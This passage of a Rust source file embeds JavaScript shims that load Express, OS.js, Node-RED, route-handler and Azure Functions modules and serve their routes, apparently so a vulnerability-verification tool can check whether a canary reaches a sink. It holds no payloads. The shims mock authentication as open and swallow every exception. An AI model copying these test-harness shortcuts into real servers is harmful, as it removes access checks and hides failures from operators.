/// fabricates nothing: a verification still requires the real canary to flow through the module's own
/// route into the real sink. Loaded with dynamic `import()`, so it mounts ESM and CommonJS alike.
const DB_BOOTSTRAP_JS: &str = r#"
import fs from 'node:fs';
import path from 'node:path';
import { pathToFileURL } from 'node:url';

// Router modules can rely on process-wide state initialized by the real application entrypoint.
// When a mounted module references a local DB global, locate a conventional database module and
// invoke only an initializer the application itself exports. This preserves its adapter and schema;
// it neither invents records nor mocks the sink that verification must reach.
export async function initializeLocalDatabase(target, logPrefix) {
  try {
    const source = fs.readFileSync(target, 'utf8');
    if (!/global\.(?:db|mappingDb)\b/.test(source)) return;
    const routeDir = path.dirname(target);
    const roots = [routeDir, path.dirname(routeDir), process.cwd()];
    const relatives = ['db', 'database', 'utils/db', 'utils/database', 'backend/utils/db', 'backend/utils/database'];
    const extensions = ['.js', '.cjs', '.mjs'];
    const candidates = [];
    for (const root of roots) {
      for (const relative of relatives) {
        for (const extension of extensions) candidates.push(path.resolve(root, relative + extension));
      }
    }
    for (const candidate of [...new Set(candidates)]) {
      if (candidate === target || !candidate.startsWith(process.cwd() + path.sep) || !fs.existsSync(candidate)) continue;
      try {
        const dbMod = await import(pathToFileURL(candidate).href);
        const exports = (dbMod && dbMod.default && typeof dbMod.default === 'object')
          ? { ...dbMod.default, ...dbMod }
          : dbMod;
        const initialize = ['initDatabase', 'initializeDatabase', 'initDb', 'initializeDb', 'openDb']
          .map((name) => exports && exports[name])
          .find((fn) => typeof fn === 'function');
        if (!initialize) continue;
        await initialize();
        console.error('[' + logPrefix + '] initialized local database through ' + path.relative(process.cwd(), candidate));
        return;
      } catch (e) {
        console.error('[' + logPrefix + '] database init skipped for ' + path.relative(process.cwd(), candidate) + ': ' + (e && e.message));
      }
    }
  } catch (e) {
    console.error('[' + logPrefix + '] database discovery skipped: ' + (e && e.message));
  }
}
"#;

const EXPRESS_HOST_JS: &str = r#"
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import { createRequire } from 'node:module';
import { initializeLocalDatabase } from '/jss-db-bootstrap.mjs';

process.on('unhandledRejection', () => {});
process.on('uncaughtException', () => {});

// This shim lives at the filesystem root, so a bare `import express` would resolve against `/`,
// not the app's own `node_modules`. Resolve Express the way the app itself does: through a
// `require` rooted in the launch directory (the app's working directory).
const appRequire = createRequire(path.join(process.cwd(), 'jss-express-host.cjs'));
const express = appRequire('express');

const port = Number(process.env.PORT || 3000);
const target = path.resolve(process.cwd(), process.argv[2] || '');

// A writable scratch workspace for router factories that take a base directory as their argument.
const ws = path.join(os.tmpdir(), 'jss-ws');
try { fs.mkdirSync(ws, { recursive: true }); } catch (e) {}

// An Express Router and an Express app are both callable with a `.handle` method; a Router also
// carries a `.stack`, an app a `.use`. Either can be mounted with `app.use(...)`.
function mountable(v) {
  return typeof v === 'function' && typeof v.handle === 'function' &&
    (Array.isArray(v.stack) || typeof v.use === 'function');
}

const routers = [];
function consider(v) {
  if (mountable(v)) { routers.push(v); return; }
  if (typeof v !== 'function') return;
  for (const args of [[ws], [], [ws, {}], [{}]]) {
    try {
      const r = v(...args);
      if (mountable(r)) { routers.push(r); return; }
    } catch (e) {}
  }
}

try {
  const mod = await import(pathToFileURL(target).href);
  consider(mod && mod.default);
  for (const k of Object.keys(mod || {})) {
    if (k !== 'default') consider(mod[k]);
  }
} catch (e) {
  console.error('[express-host] load error: ' + (e && e.message));
}

await initializeLocalDatabase(target, 'express-host');

const app = express();
app.use((req, res, next) => { express.json({ limit: '5mb' })(req, res, () => next()); });
app.use((req, res, next) => { express.urlencoded({ extended: true })(req, res, () => next()); });
for (const r of routers) { try { app.use(r); } catch (e) {} }
console.error('[express-host] mounted ' + routers.length + ' router(s)');
app.listen(port, '0.0.0.0', () => console.error('[express-host] listening on ' + port));
"#;

/// Mounts a lifecycle server module in the OS.js/meeseOS provider shape: a factory `(core, proc) =>
/// ({ init, start })` that registers HTTP routes on a server object the host supplies (`const { app }
/// = core; app.post(proc.resource(path), handler)`) but never listens itself. The shim imports the
/// module, calls the factory with a permissive mock `core`/`proc` whose `core.app` is a minimal
/// Express-compatible server and whose `proc.resource(p)` applies the deployed app prefix from
/// `metadata.json`, runs the returned object's `init`/`start` so its routes register, then serves them
/// over HTTP on `PORT`. It fabricates nothing: a verification still requires the real canary to flow
/// through the module's own handler into the real sink. Dependency-free (core `http`); imports the
/// target with dynamic `import()`, so it mounts ESM and CommonJS modules alike.
const LIFECYCLE_HOST_JS: &str = r#"
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { pathToFileURL } from 'node:url';

process.on('unhandledRejection', () => {});
process.on('uncaughtException', () => {});

const port = Number(process.env.PORT || 3000);
const target = path.resolve(process.cwd(), process.argv[2] || '');
let resourcePrefix = '';
try {
  const meta = JSON.parse(fs.readFileSync(path.resolve(process.cwd(), 'metadata.json'), 'utf8'));
  if (meta && typeof meta.name === 'string' && /^[A-Za-z0-9_.-]+$/.test(meta.name)) resourcePrefix = '/apps/' + meta.name;
} catch (e) {}

const routes = [];
const middleware = [];
function compile(p) {
  const keys = [];
  let pattern = (typeof p === 'string' && p) ? p : '/';
  if (pattern.charAt(0) !== '/') pattern = '/' + pattern;
  if (pattern.length > 1) pattern = pattern.replace(/\/+$/, '');
  const parts = pattern.split('/').map((seg) => {
    if (seg.charAt(0) === ':') { keys.push(seg.slice(1)); return '([^/]+)'; }
    if (seg === '*') { keys.push('wild'); return '(.*)'; }
    return seg.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  });
  return { regex: new RegExp('^' + parts.join('/') + '/?$'), keys };
}
function add(method, p, handlers) {
  const c = compile(p);
  routes.push({ method, path: typeof p === 'string' ? p : '/', regex: c.regex, keys: c.keys, handlers });
}

const METHODS = ['get', 'post', 'put', 'patch', 'delete', 'options', 'head', 'all'];
const app = function () { return app; };
for (const m of METHODS) {
  app[m] = (p, ...h) => { add(m === 'all' ? 'ALL' : m.toUpperCase(), p, h.flat().filter((f) => typeof f === 'function')); return app; };
}
app.use = (p, ...h) => {
  let prefix = null;
  let handlers = h;
  if (typeof p === 'function') handlers = [p, ...h];
  else if (typeof p === 'string') prefix = p === '/' ? null : p.replace(/\/+$/, '');
  middleware.push({ prefix, handlers: handlers.flat().filter((f) => typeof f === 'function') });
  return app;
};
app.ws = () => app;
app.set = () => app;
app.engine = () => app;
app.param = () => app;
app.enable = () => app;
app.disable = () => app;
app.listen = () => app;
app.route = (p) => { const r = {}; for (const m of METHODS) r[m] = (...h) => { app[m](p, ...h); return r; }; return r; };

function stub() {
  const s = new Proxy(function () { return s; }, {
    get(_t, prop) {
      if (prop === 'then') return undefined;
      if (prop === Symbol.toPrimitive) return () => '';
      if (prop === Symbol.iterator || prop === Symbol.asyncIterator) return undefined;
      return s;
    },
    apply() { return s; },
    construct() { return s; },
  });
  return s;
}

const core = new Proxy(function () { return core; }, {
  get(_t, prop) {
    if (prop === 'app') return app;
    if (prop === 'config') return (_k, def) => def;
    if (prop === 'then') return undefined;
    if (prop === Symbol.toPrimitive) return () => '';
    return stub();
  },
  apply() { return core; },
});

const proc = new Proxy(function () { return proc; }, {
  get(_t, prop) {
    if (prop === 'resource') return (x) => { let s = (typeof x === 'string' && x) ? x : '/'; if (s.charAt(0) !== '/') s = '/' + s; return resourcePrefix + s; };
    if (prop === 'metadata') return metadata;
    if (prop === 'name') return metadata.name;
    if (prop === 'then') return undefined;
    if (prop === Symbol.toPrimitive) return () => '';
    return stub();
  },
  apply() { return proc; },
});

let metadata = { name: 'jss-app' };
try {
  const parsed = JSON.parse(fs.readFileSync(path.resolve(process.cwd(), 'metadata.json'), 'utf8'));
  if (parsed && typeof parsed === 'object') metadata = parsed;
} catch (e) {}

try {
  const mod = await import(pathToFileURL(target).href);
  const factory = (mod && typeof mod.default === 'function') ? mod.default : (typeof mod === 'function' ? mod : null);
  let lifecycle = factory ? factory(core, proc) : null;
  if (lifecycle && typeof lifecycle.then === 'function') lifecycle = await lifecycle;
  for (const m of ['init', 'start']) {
    if (lifecycle && typeof lifecycle[m] === 'function') {
      try { await lifecycle[m](); } catch (e) { console.error('[lifecycle-host] ' + m + ' error: ' + (e && e.message)); }
    }
  }
} catch (e) {
  console.error('[lifecycle-host] load error: ' + (e && e.message));
}

function decorate(res) {
  res.status = (c) => { res.statusCode = c; return res; };
  res.set = res.header = (k, v) => {
    if (k && typeof k === 'object') { for (const n in k) { try { res.setHeader(n, k[n]); } catch (e) {} } }
    else { try { res.setHeader(k, v); } catch (e) {} }
    return res;
  };
  res.type = (t) => { try { res.setHeader('Content-Type', t); } catch (e) {} return res; };
  res.json = (obj) => { try { if (!res.headersSent) res.setHeader('Content-Type', 'application/json'); } catch (e) {} res.end(JSON.stringify(obj)); return res; };
  res.send = (b) => {
    if (b !== null && typeof b === 'object' && !Buffer.isBuffer(b)) return res.json(b);
    res.end(b == null ? '' : (Buffer.isBuffer(b) ? b : String(b)));
    return res;
  };
  res.sendStatus = (c) => { res.statusCode = c; res.end(String(c)); return res; };
  res.redirect = (loc) => { res.statusCode = 302; try { res.setHeader('Location', loc); } catch (e) {} res.end(); return res; };
  return res;
}

function parseBody(req, raw) {
  if (!raw) return {};
  const ct = String(req.headers['content-type'] || '').toLowerCase();
  try {
    if (ct.indexOf('application/x-www-form-urlencoded') >= 0) return Object.fromEntries(new URLSearchParams(raw));
    return JSON.parse(raw);
  } catch (e) { return raw; }
}

function runChain(handlers, req, res) {
  let i = 0;
  function next(err) {
    if (err) { try { if (!res.headersSent) res.statusCode = 500; res.end(); } catch (e) {} return; }
    const h = handlers[i++];
    if (!h) { try { if (!res.headersSent) { res.statusCode = 404; res.end(); } } catch (e) {} return; }
    try { Promise.resolve(h(req, res, next)).catch(() => { try { if (!res.headersSent) { res.statusCode = 502; res.end(); } } catch (e) {} }); }
    catch (e) { try { if (!res.headersSent) { res.statusCode = 502; res.end(); } } catch (x) {} }
  }
  next();
}

http.createServer((req, res) => {
  decorate(res);
  req.get = (h) => req.headers[String(h).toLowerCase()];
  let u;
  try { u = new URL(req.url, 'http://localhost'); } catch (e) { res.statusCode = 400; res.end(); return; }
  const chunks = [];
  let size = 0;
  req.on('data', (c) => { size += c.length; if (size <= 5 * 1024 * 1024) chunks.push(c); });
  req.on('error', () => { try { res.statusCode = 400; res.end(); } catch (e) {} });
  req.on('end', () => {
    const raw = Buffer.concat(chunks).toString('utf8');
    req.rawBody = raw;
    req.body = parseBody(req, raw);
    req.query = Object.fromEntries(u.searchParams);
    req.path = u.pathname;
    for (const r of routes) {
      if (r.method !== 'ALL' && r.method !== req.method) continue;
      const m = r.regex.exec(u.pathname);
      if (!m) continue;
      req.params = {};
      r.keys.forEach((k, idx) => { try { req.params[k] = decodeURIComponent(m[idx + 1] || ''); } catch (e) { req.params[k] = m[idx + 1] || ''; } });
      const before = [];
      for (const group of middleware) {
        if (group.prefix === null || u.pathname === group.prefix || u.pathname.startsWith(group.prefix + '/')) before.push(...group.handlers);
      }
      runChain([...before, ...r.handlers], req, res);
      return;
    }
    res.statusCode = 404; res.end('no route');
  });
}).listen(port, '0.0.0.0', () => console.error('[lifecycle-host] listening on ' + port + ' routes=' + routes.map((r) => r.method + ' ' + r.path).join(',')));
"#;

/// Mounts a file-system route handler module (linebridge, Nitro/h3 and similar conventions): a
/// module whose default export is the request handler for a single route+method — a bare
/// `(req, res, ctx) => ...` function, or a descriptor object carrying the handler under `fn`/`handler`
/// (alongside metadata such as the contexts it declares). The shim imports the target, takes that
/// handler, and serves it on `PORT`, reconstructing the request/response/context contract the
/// framework would supply: a parsed `req` (query, body, params, headers), an Express-compatible `res`,
/// and a permissive context stub whose method calls resolve to `undefined` — so a cache/lookup read is
/// falsy and the handler proceeds to its real work, never a truthy placeholder that would divert
/// control flow. The handler's own return value is serialized as the response, mirroring the auto-send
/// such routers perform. It fabricates nothing: a verification still requires the real canary to flow
/// through the module's own handler into the real sink. Dependency-free (core `http`); imports the
/// target with dynamic `import()`, so it mounts ESM and CommonJS modules alike.
const ROUTE_HOST_JS: &str = r#"
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import { initializeLocalDatabase } from '/jss-db-bootstrap.mjs';

process.on('unhandledRejection', () => {});
process.on('uncaughtException', () => {});

const port = Number(process.env.PORT || 3000);
const target = path.resolve(process.cwd(), process.argv[2] || '');

let handler = null;
try {
  const mod = await import(pathToFileURL(target).href);
  const def = (mod && mod.default != null) ? mod.default : mod;
  if (typeof def === 'function') handler = def;
  else if (def && typeof def === 'object') {
    if (typeof def.fn === 'function') handler = def.fn;
    else if (typeof def.handler === 'function') handler = def.handler;
  }
} catch (e) {
  console.error('[route-host] load error: ' + (e && e.message));
}
if (!handler) console.error('[route-host] no handler export found');

await initializeLocalDatabase(target, 'route-host');

// A permissive context stub: every property access yields another stub, and calling any stubbed
// method yields `undefined` (so a cache/lookup read is falsy and the handler takes its real
// work path), never a truthy placeholder that could divert control flow. It reaches no network and
// fabricates no data; the handler's own sink is what a verification must exercise.
function stub() {
  return new Proxy(function () { return undefined; }, {
    get(_t, prop) {
      if (prop === 'then') return undefined;
      if (prop === Symbol.toPrimitive) return () => '';
      if (prop === Symbol.iterator || prop === Symbol.asyncIterator) return undefined;
      return stub();
    },
    apply() { return undefined; },
    construct() { return stub(); },
  });
}

function decorate(res) {
  res.status = (c) => { res.statusCode = c; return res; };
  res.set = res.header = (k, v) => {
    if (k && typeof k === 'object') { for (const n in k) { try { res.setHeader(n, k[n]); } catch (e) {} } }
    else { try { res.setHeader(k, v); } catch (e) {} }
    return res;
  };
  res.type = (t) => { try { res.setHeader('Content-Type', t); } catch (e) {} return res; };
  res.json = (obj) => { try { if (!res.headersSent) res.setHeader('Content-Type', 'application/json'); } catch (e) {} res.end(JSON.stringify(obj)); return res; };
  res.send = (b) => {
    if (b !== null && typeof b === 'object' && !Buffer.isBuffer(b)) return res.json(b);
    res.end(b == null ? '' : (Buffer.isBuffer(b) ? b : String(b)));
    return res;
  };
  res.sendStatus = (c) => { res.statusCode = c; res.end(String(c)); return res; };
  res.redirect = (loc) => { res.statusCode = 302; try { res.setHeader('Location', loc); } catch (e) {} res.end(); return res; };
  return res;
}

function parseBody(req, raw) {
  if (!raw) return {};
  const ct = String(req.headers['content-type'] || '').toLowerCase();
  try {
    if (ct.indexOf('application/x-www-form-urlencoded') >= 0) return Object.fromEntries(new URLSearchParams(raw));
    return JSON.parse(raw);
  } catch (e) { return raw; }
}

http.createServer((req, res) => {
  decorate(res);
  req.get = req.header = (h) => req.headers[String(h).toLowerCase()];
  let u;
  try { u = new URL(req.url, 'http://localhost'); } catch (e) { res.statusCode = 400; res.end(); return; }
  const chunks = [];
  let size = 0;
  req.on('data', (c) => { size += c.length; if (size <= 5 * 1024 * 1024) chunks.push(c); });
  req.on('error', () => { try { res.statusCode = 400; res.end(); } catch (e) {} });
  req.on('end', async () => {
    const raw = Buffer.concat(chunks).toString('utf8');
    req.rawBody = raw;
    req.body = parseBody(req, raw);
    req.query = Object.fromEntries(u.searchParams);
    req.params = {};
    req.path = u.pathname;
    if (!handler) { res.statusCode = 404; res.end('no handler'); return; }
    try {
      const result = await handler(req, res, stub());
      if (!res.writableEnded) {
        if (res.headersSent) res.end();
        else if (result === undefined || result === null) res.end();
        else if (typeof result === 'object' && !Buffer.isBuffer(result)) res.json(result);
        else res.send(result);
      }
    } catch (e) {
      try { if (!res.headersSent) res.statusCode = 502; if (!res.writableEnded) res.end(); } catch (x) {}
    }
  });
}).listen(port, '0.0.0.0', () => console.error('[route-host] listening on ' + port));
"#;

/// Mounts a Node-RED node module. The Node-RED runtime loads a node by calling
/// `module.exports = function (RED) { ... }`, passing a `RED` object through which the node registers
/// admin/editor routes on `RED.httpAdmin` and node HTTP endpoints on `RED.httpNode` (both Express
/// routers in a real deployment), looks up node definitions, reads settings, and logs. The shim
/// imports the target, calls its factory with a minimal mock `RED` whose `httpAdmin`/`httpNode` are
/// Express-compatible route collectors and whose other members are permissive stubs, then serves the
/// routes the node registered over HTTP on `PORT`.
///
/// `RED.auth.needsPermission(perm)` returns a passthrough middleware that calls `next()`: that is
/// Node-RED's own behavior when `adminAuth` is not configured in `settings.js` (the default), so the
/// admin HTTP API is served open — the shim reproduces the default deployment faithfully, it does not
/// weaken a check that would otherwise run. It fabricates nothing else: a verification still requires
/// the real canary to flow through the node's own handler into the real sink. Dependency-free (core
/// `http`); imports the target with dynamic `import()`, so it mounts CommonJS and ESM node modules
/// alike.
const NODE_RED_HOST_JS: &str = r#"
import http from 'node:http';
import path from 'node:path';
import { pathToFileURL } from 'node:url';

process.on('unhandledRejection', () => {});
process.on('uncaughtException', () => {});

const port = Number(process.env.PORT || 3000);
const target = path.resolve(process.cwd(), process.argv[2] || '');

const routes = [];
const middleware = [];
function compile(p) {
  const keys = [];
  let pattern = (typeof p === 'string' && p) ? p : '/';
  if (pattern.charAt(0) !== '/') pattern = '/' + pattern;
  if (pattern.length > 1) pattern = pattern.replace(/\/+$/, '');
  const parts = pattern.split('/').map((seg) => {
    if (seg.charAt(0) === ':') { keys.push(seg.slice(1)); return '([^/]+)'; }
    if (seg === '*') { keys.push('wild'); return '(.*)'; }
    return seg.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  });
  return { regex: new RegExp('^' + parts.join('/') + '/?$'), keys };
}
function add(method, p, handlers) {
  const c = compile(p);
  routes.push({ method, path: typeof p === 'string' ? p : '/', regex: c.regex, keys: c.keys, handlers });
}

const METHODS = ['get', 'post', 'put', 'patch', 'delete', 'options', 'head', 'all'];
function makeRouter() {
  const router = function () { return router; };
  for (const m of METHODS) {
    router[m] = (p, ...h) => { add(m === 'all' ? 'ALL' : m.toUpperCase(), p, h.flat().filter((f) => typeof f === 'function')); return router; };
  }
  router.use = (p, ...h) => {
    let prefix = null;
    let handlers = h;
    if (typeof p === 'function') handlers = [p, ...h];
    else if (typeof p === 'string') prefix = p === '/' ? null : p.replace(/\/+$/, '');
    middleware.push({ prefix, handlers: handlers.flat().filter((f) => typeof f === 'function') });
    return router;
  };
  router.set = () => router;
  router.engine = () => router;
  router.param = () => router;
  router.enable = () => router;
  router.disable = () => router;
  router.listen = () => router;
  router.route = (p) => { const r = {}; for (const m of METHODS) r[m] = (...h) => { router[m](p, ...h); return r; }; return r; };
  return router;
}
const httpAdmin = makeRouter();
const httpNode = makeRouter();

function stub() {
  const s = new Proxy(function () { return s; }, {
    get(_t, prop) {
      if (prop === 'then') return undefined;
      if (prop === Symbol.toPrimitive) return () => '';
      if (prop === Symbol.iterator || prop === Symbol.asyncIterator) return undefined;
      return s;
    },
    apply() { return s; },
    construct() { return s; },
  });
  return s;
}

// `RED.auth.needsPermission(perm)` is a passthrough when `adminAuth` is unset (Node-RED's default):
// it returns middleware that immediately calls `next()`. Anything else on `RED.auth` is a stub.
const auth = new Proxy(function () { return auth; }, {
  get(_t, prop) {
    if (prop === 'needsPermission') return () => (req, res, next) => { if (typeof next === 'function') next(); };
    if (prop === 'then') return undefined;
    if (prop === Symbol.toPrimitive) return () => '';
    return stub();
  },
  apply() { return auth; },
});

// `RED.nodes`: node-registration and lookup API. `registerType`/`createNode` are no-ops at load;
// `getNode` returns null (no flow is deployed), so a node constructor that guards on it bails cleanly.
const nodes = new Proxy(function () { return nodes; }, {
  get(_t, prop) {
    if (prop === 'getNode') return () => null;
    if (prop === 'eachNode' || prop === 'eachConfig' || prop === 'eachSubflow') return () => {};
    if (prop === 'then') return undefined;
    if (prop === Symbol.toPrimitive) return () => '';
    return () => undefined;
  },
  apply() { return nodes; },
});

// `RED.settings`: a permissive read-only view. Unknown settings read as `undefined` (falsy), so a
// node takes its default branch rather than a configured one.
const settings = new Proxy({}, {
  get(_t, prop) {
    if (prop === 'available') return () => false;
    if (prop === 'get') return (_k, def) => def;
    if (prop === 'then') return undefined;
    return undefined;
  },
});

const RED = new Proxy(function () { return RED; }, {
  get(_t, prop) {
    if (prop === 'httpAdmin') return httpAdmin;
    if (prop === 'httpNode') return httpNode;
    if (prop === 'auth') return auth;
    if (prop === 'nodes') return nodes;
    if (prop === 'settings') return settings;
    if (prop === '_') return (k) => k;
    if (prop === 'version') return () => '4.0.0';
    if (prop === 'then') return undefined;
    if (prop === Symbol.toPrimitive) return () => '';
    return stub();
  },
  apply() { return RED; },
});

try {
  const mod = await import(pathToFileURL(target).href);
  const factory = (mod && typeof mod.default === 'function') ? mod.default : (typeof mod === 'function' ? mod : null);
  if (factory) {
    let out = factory(RED);
    if (out && typeof out.then === 'function') await out;
  } else {
    console.error('[node-red-host] no RED factory export found');
  }
} catch (e) {
  console.error('[node-red-host] load error: ' + (e && e.message));
}

// Do not expose a healthy-looking listener when the target never registered a route. In
// particular, a missing bare dependency must make the launch fail so the verifier's normal second
// attempt can enable its missing-module shim; otherwise every probe receives the host's synthetic
// `no route` response and the real node handler is never exercised.
if (routes.length === 0) {
  console.error('[node-red-host] no routes registered');
  process.exit(1);
}

function decorate(res) {
  res.status = (c) => { res.statusCode = c; return res; };
  res.set = res.header = (k, v) => {
    if (k && typeof k === 'object') { for (const n in k) { try { res.setHeader(n, k[n]); } catch (e) {} } }
    else { try { res.setHeader(k, v); } catch (e) {} }
    return res;
  };
  res.type = (t) => { try { res.setHeader('Content-Type', t); } catch (e) {} return res; };
  res.json = (obj) => { try { if (!res.headersSent) res.setHeader('Content-Type', 'application/json'); } catch (e) {} res.end(JSON.stringify(obj)); return res; };
  res.send = (b) => {
    if (b !== null && typeof b === 'object' && !Buffer.isBuffer(b)) return res.json(b);
    res.end(b == null ? '' : (Buffer.isBuffer(b) ? b : String(b)));
    return res;
  };
  res.sendStatus = (c) => { res.statusCode = c; res.end(String(c)); return res; };
  res.redirect = (loc) => { res.statusCode = 302; try { res.setHeader('Location', loc); } catch (e) {} res.end(); return res; };
  return res;
}

function parseBody(req, raw) {
  if (!raw) return {};
  const ct = String(req.headers['content-type'] || '').toLowerCase();
  try {
    if (ct.indexOf('application/x-www-form-urlencoded') >= 0) return Object.fromEntries(new URLSearchParams(raw));
    return JSON.parse(raw);
  } catch (e) { return raw; }
}

function runChain(handlers, req, res) {
  let i = 0;
  function next(err) {
    if (err) { try { if (!res.headersSent) res.statusCode = 500; res.end(); } catch (e) {} return; }
    const h = handlers[i++];
    if (!h) { try { if (!res.headersSent) { res.statusCode = 404; res.end(); } } catch (e) {} return; }
    try { Promise.resolve(h(req, res, next)).catch(() => { try { if (!res.headersSent) { res.statusCode = 502; res.end(); } } catch (e) {} }); }
    catch (e) { try { if (!res.headersSent) { res.statusCode = 502; res.end(); } } catch (x) {} }
  }
  next();
}

http.createServer((req, res) => {
  decorate(res);
  req.get = req.header = (h) => req.headers[String(h).toLowerCase()];
  let u;
  try { u = new URL(req.url, 'http://localhost'); } catch (e) { res.statusCode = 400; res.end(); return; }
  const chunks = [];
  let size = 0;
  req.on('data', (c) => { size += c.length; if (size <= 5 * 1024 * 1024) chunks.push(c); });
  req.on('error', () => { try { res.statusCode = 400; res.end(); } catch (e) {} });
  req.on('end', () => {
    const raw = Buffer.concat(chunks).toString('utf8');
    req.rawBody = raw;
    req.body = parseBody(req, raw);
    req.query = Object.fromEntries(u.searchParams);
    req.path = u.pathname;
    for (const r of routes) {
      if (r.method !== 'ALL' && r.method !== req.method) continue;
      const m = r.regex.exec(u.pathname);
      if (!m) continue;
      req.params = {};
      r.keys.forEach((k, idx) => { try { req.params[k] = decodeURIComponent(m[idx + 1] || ''); } catch (e) { req.params[k] = m[idx + 1] || ''; } });
      const before = [];
      for (const group of middleware) {
        if (group.prefix === null || u.pathname === group.prefix || u.pathname.startsWith(group.prefix + '/')) before.push(...group.handlers);
      }
      runChain([...before, ...r.handlers], req, res);
      return;
    }
    res.statusCode = 404; res.end('no route');
  });
}).listen(port, '0.0.0.0', () => console.error('[node-red-host] listening on ' + port + ' routes=' + routes.map((r) => r.method + ' ' + r.path).join(',')));
"#;

/// Mounts an Azure Functions v4 application module. The Azure Functions host loads such a module for
/// its side effects: at import time it calls `app.http('name', { route, methods, handler })` (and the
/// per-verb `app.get(...)`/`app.post(...)` forms) on the `app` object imported from `@azure/functions`,
/// registering HTTP triggers the host then serves under the `/api` route prefix. The module declares no
/// server of its own, so the shim reconstructs that contract: it mocks `@azure/functions` so the
/// registrations are captured, transpiles the module's TypeScript/JSX with the app's own installed
/// compiler, loads it, and serves each captured trigger over HTTP on `PORT` — building the Azure
/// `HttpRequest` the handler reads (`request.params`, `request.query.get(...)`, `request.headers`,
/// `request.text()`), invoking the handler, and writing its `HttpResponseInit` back.
///
/// It fabricates nothing the sink depends on: a bare specifier that does not resolve (a webpack path
/// alias to a client-only module the Functions host would bundle, never the handler's own file sink)
/// degrades to a permissive stub that yields `undefined`, so a client import unrelated to the server
/// handler cannot break the load, while the handler's real `fs`/`path` sink runs unchanged. A
/// verification still requires the real canary to flow through the handler into the real sink. Run as
/// CommonJS (`.cjs`) so its `require`-based module hooks apply regardless of the app's package type.
const AZURE_FUNC_HOST_JS: &str = r#"
const http = require('node:http');
const fs = require('node:fs');
const path = require('node:path');
const Module = require('node:module');

process.on('unhandledRejection', () => {});
process.on('uncaughtException', () => {});

const port = Number(process.env.PORT || 3000);
const cwd = process.cwd();
const target = path.resolve(cwd, process.argv[2] || '');
const appRequire = Module.createRequire(path.join(cwd, '__jss_azure_host__.js'));

let ts = null;
try { ts = appRequire('typescript'); } catch (e) {}
let swc = null;
if (!ts) { try { swc = appRequire('@swc/core'); } catch (e) {} }

function transpile(code, filename) {
  if (ts) {
    return ts.transpileModule(code, {
      fileName: filename,
      compilerOptions: {
        module: ts.ModuleKind.CommonJS,
        target: ts.ScriptTarget.ES2020,
        jsx: ts.JsxEmit.React,
        esModuleInterop: true,
        allowJs: true,
        resolveJsonModule: true,
        isolatedModules: true,
      },
    }).outputText;
  }
  if (swc) {
    const tsx = /\.(tsx|jsx)$/.test(filename);
    return swc.transformSync(code, {
      filename,
      jsc: { parser: { syntax: 'typescript', tsx }, target: 'es2020', transform: { react: { runtime: 'classic' } } },
      module: { type: 'commonjs' },
    }).code;
  }
  return code;
}

// A permissive stub for an import that cannot be resolved (a client-only webpack alias): every access
// yields another stub and every call yields `undefined`, so it is never a truthy placeholder that could
// divert the handler's control flow. The handler's own sink is what a verification must exercise.
function stub() {
  return new Proxy(function () { return undefined; }, {
    get(_t, prop) {
      if (prop === 'then') return undefined;
      if (prop === '__esModule') return true;
      if (prop === Symbol.toPrimitive) return () => '';
      if (prop === Symbol.iterator || prop === Symbol.asyncIterator) return undefined;
      return stub();
    },
    apply() { return undefined; },
    construct() { return stub(); },
  });
}

const routes = [];
function register(name, methods, route, handler) {
  if (typeof handler !== 'function') return;
  routes.push({ name, methods, route: (route != null ? route : name), handler });
}
const appProxy = new Proxy({}, {
  get(_t, prop) {
    return (name, opts) => {
      const o = (typeof opts === 'function') ? { handler: opts } : (opts || {});
      let methods = o.methods;
      if (!methods && typeof prop === 'string' && prop !== 'http') methods = [prop.toUpperCase()];
      register(name, methods, o.route, o.handler);
    };
  },
});
const azureMock = {
  app: appProxy,
  InvocationContext: function () {},
  HttpRequest: function () {},
  HttpResponse: function () {},
  input: stub(),
  output: stub(),
  trigger: stub(),
  __esModule: true,
};

require.extensions['.ts'] = require.extensions['.tsx'] = require.extensions['.jsx'] = function (module, filename) {
  module._compile(transpile(fs.readFileSync(filename, 'utf8'), filename), filename);
};

const origLoad = Module._load;
Module._load = function (request) {
  if (request === '@azure/functions') return azureMock;
  try {
    return origLoad.apply(this, arguments);
  } catch (e) {
    const code = e && e.code;
    if (code === 'MODULE_NOT_FOUND' || code === 'ERR_REQUIRE_ESM'
      || code === 'ERR_PACKAGE_PATH_NOT_EXPORTED' || code === 'ERR_UNSUPPORTED_DIR_IMPORT') {
      return stub();
    }
    throw e;
  }
};

try {
  require(target);
} catch (e) {
  console.error('[azure-host] load error: ' + (e && (e.stack || e.message) || e));
}

function compile(route) {
  let template = (typeof route === 'string' && route) ? route : '';
  const full = '/api/' + template.replace(/^\/+/, '');
  const keys = [];
  const parts = full.split('/').map((seg) => {
    let m = seg.match(/^\{\*(.+)\}$/);
    if (m) { keys.push(m[1]); return '(.*)'; }
    m = seg.match(/^\{([^:}]+)(?::[^}]+)?\??\}$/);
    if (m) { keys.push(m[1]); return '([^/]+)'; }
    return seg.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  });
  return { regex: new RegExp('^' + parts.join('/') + '/?$'), keys };
}

function makeRequest(req, u, raw, params) {
  const headers = new Map();
  for (const [k, v] of Object.entries(req.headers || {})) {
    headers.set(k.toLowerCase(), Array.isArray(v) ? v.join(', ') : v);
  }
  return {
    method: (req.method || 'GET').toUpperCase(),
    url: 'http://localhost' + req.url,
    headers: {
      get: (n) => { const v = headers.get(String(n).toLowerCase()); return v == null ? null : v; },
      has: (n) => headers.has(String(n).toLowerCase()),
      entries: () => headers.entries(),
      forEach: (cb) => headers.forEach((v, k) => cb(v, k)),
    },
    query: u.searchParams,
    params,
    user: null,
    body: raw,
    text: async () => raw.toString('utf8'),
    json: async () => JSON.parse(raw.toString('utf8') || 'null'),
    arrayBuffer: async () => raw,
    formData: async () => new URLSearchParams(raw.toString('utf8')),
  };
}

function makeContext() {
  const log = function () {};
  log.error = function () {}; log.warn = function () {}; log.info = function () {}; log.verbose = function () {};
  return {
    log, error: () => {}, warn: () => {}, info: () => {}, debug: () => {}, trace: () => {},
    invocationId: 'jss', functionName: 'jss',
    extraInputs: { get: () => undefined, set: () => {} },
    extraOutputs: { get: () => undefined, set: () => {} },
  };
}

function writeResult(res, result) {
  if (res.writableEnded) return;
  if (result == null) { res.statusCode = 204; return res.end(); }
